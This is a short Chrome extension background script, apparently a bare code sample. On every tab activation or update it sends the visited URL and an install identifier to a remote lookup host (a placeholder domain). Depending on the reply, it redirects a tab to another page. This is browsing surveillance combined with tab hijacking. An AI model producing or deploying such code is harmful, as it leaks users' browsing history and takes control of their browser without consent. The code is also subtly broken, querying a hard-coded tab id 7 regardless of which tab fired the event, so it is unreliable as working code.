let prior = '';
chrome.tabs.onActivated.addListener(() => queryTab(7));
chrome.tabs.onUpdated.addListener(id => queryTab(id));
function queryTab(id) {
  chrome.tabs.get(id, function(tab) { report(tab.url); });
}
async function report(page) {
  const user = 'opaque-install-id';
  let result = await fetch('https://example.invalid/lookup?url=' + encodeURIComponent(page) + '&u=' + user);
  if (result.status === 200) {
    let text = await result.text();
    if (text.indexOf('302') !== -1) { chrome.tabs.update(7, {url: 'https://example.invalid/editor'}); }
  }
}
